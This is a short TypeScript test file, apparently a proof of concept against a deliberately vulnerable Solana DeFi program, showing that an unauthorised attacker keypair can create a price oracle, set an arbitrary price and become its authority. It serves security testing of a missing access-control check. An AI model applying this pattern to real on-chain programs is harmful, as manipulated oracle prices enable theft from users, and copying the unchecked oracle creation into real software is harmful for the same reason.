import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnerableDefiProtocol } from "../target/types/vulnerable_defi_protocol";
import { assert } from "chai";

// POC #1: Unauthorized Oracle Creation
// Mirrors the specific exploit for vulnerability #1

describe("POC #1 - Unauthorized Oracle Creation", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.VulnerableDefiProtocol as Program<VulnerableDefiProtocol>;

  let attacker: anchor.web3.Keypair;

  before(async () => {
    attacker = anchor.web3.Keypair.generate();
    const airdropAmount = 5 * anchor.web3.LAMPORTS_PER_SOL;
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(attacker.publicKey, airdropAmount)
    );
  });

  it("Attacker creates oracle without authorization", async () => {
    const attackerOracle = anchor.web3.Keypair.generate();

    await program.methods
      .createOracle(new anchor.BN(1_000_000_000))
      .accounts({
        oracle: attackerOracle.publicKey,
        signer: attacker.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([attacker, attackerOracle])
      .rpc();

    const oracleData = await program.account.oracle.fetch(attackerOracle.publicKey);
    assert.equal(oracleData.price.toString(), "1000000000");
    assert.equal(oracleData.authority.toString(), attacker.publicKey.toString());
  });
});
